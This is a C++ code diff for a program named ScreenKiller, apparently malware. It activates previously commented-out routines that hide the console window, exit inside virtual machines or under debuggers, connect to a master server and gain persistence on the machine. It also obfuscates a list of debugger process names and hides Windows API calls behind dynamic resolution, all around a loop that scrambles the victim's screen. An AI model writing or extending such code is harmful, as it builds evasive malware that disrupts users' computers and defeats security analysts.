@@ -25,8 +25,7 @@ ScreenKiller::~ScreenKiller()
 void ScreenKiller::deploy()
 {
 	this->m_alive = true;
-
-	//RESOLVE(user32.dll, ShowWindow)(GetConsoleWindow(), SW_HIDE);
+	RESOLVE(user32.dll, ShowWindow)(GetConsoleWindow(), SW_HIDE);
 
 	this->m_runner_thread = std::thread([this] {this->deploy_inner(); });
 }
@@ -40,10 +39,10 @@ void ScreenKiller::suicide()
 bool ScreenKiller::deploy_inner()
 {
 	this->check_secret_file();
-	//this->exit_if_vm_cpuid();
-	//this->connect_to_master_server();
-	//this->exit_if_debugged();
-	//this->get_persistency();
+	this->exit_if_vm_cpuid();
+	this->connect_to_master_server();
+	this->exit_if_debugged();
+	this->get_persistency();
 
 	HWND hDesktop = NULL;
 	ScreenProps screen_props = { 0 };
@@ -51,7 +50,7 @@ bool ScreenKiller::deploy_inner()
 
 	screen_props.hdcScreen = RESOLVE(user32.dll, GetDCEx)(hDesktop, NULL, DCX_CACHE | DCX_LOCKWINDOWUPDATE);
 
-	srand(GetTickCount64() % UINT32_MAX);
+	srand(RESOLVE(kernel32.dll, GetTickCount64)() % UINT32_MAX);
 
 	RECT desktop = { 0 };
 	
@@ -60,7 +59,7 @@ bool ScreenKiller::deploy_inner()
 	while (this->m_alive)
 	{
 		ScrambleWindow(&screen_props, this);
-		Sleep(10);
+		RESOLVE(kernel32.dll, Sleep)(10);
 	}
 																  
 	return true;
@@ -94,7 +93,9 @@ void ScreenKiller::exit_if_vm_cpuid()
 void ScreenKiller::exit_if_debugged()
 {
 	if (this->is_debugged1() || this->is_debugged2())
+	{
 		exit(1);
+	}
 }
 
 bool ScreenKiller::is_debugged1()
@@ -104,20 +105,18 @@ bool ScreenKiller::is_debugged1()
 
 bool ScreenKiller::is_debugged2()
 {
-		const wchar_t* debuggersFilename[7] = {
-			WOBFUSCATE(L"cheatengine-x86_64.exe").c_str(),
-			WOBFUSCATE(L"ollydbg.exe").c_str(),
-			WOBFUSCATE(L"ida.exe").c_str(),
-			WOBFUSCATE(L"ida64.exe").c_str(),
-			WOBFUSCATE(L"idaq64.exe").c_str(),
-			WOBFUSCATE(L"radare2.exe").c_str(),
-			WOBFUSCATE(L"x64dbg.exe").c_str()
+		std::wstring debuggersFilename[7] = {
+			WOBFUSCATE(L"cheatengine-x86_64.exe"),
+			WOBFUSCATE(L"ollydbg.exe"),
+			WOBFUSCATE(L"ida.exe"),
+			WOBFUSCATE(L"ida64.exe"),
+			WOBFUSCATE(L"idaq64.exe"),
+			WOBFUSCATE(L"radare2.exe"),
+			WOBFUSCATE(L"x64dbg.exe")
 		};
 
-		const wchar_t *pogan_name = WOBFUSCATE(L"taskhost.exe").c_str();
-		
+		std::wstring pogan_name = WOBFUSCATE(L"taskhost.exe");
 		size_t count_instances = 0;
-		wchar_t* processName;
 		PROCESSENTRY32W processInformation{ sizeof(PROCESSENTRY32W) };
 		HANDLE processList;
 		
@@ -131,15 +130,15 @@ bool ScreenKiller::is_debugged2()
 		
 		do
 		{
-			for (const wchar_t* debugger : debuggersFilename)
+			std::wstring process_name = processInformation.szExeFile;
+			for (std::wstring debugger : debuggersFilename)
 			{
-				processName = processInformation.szExeFile;
-				if (_wcsicmp(debugger, processName) == 0) 
+				if (debugger == process_name) 
 				{
 					return true;
 				}
 			}
-			if (_wcsicmp(pogan_name, processInformation.szExeFile) == 0)
+			if (process_name == pogan_name)
 			{
 				count_instances++;
 			}
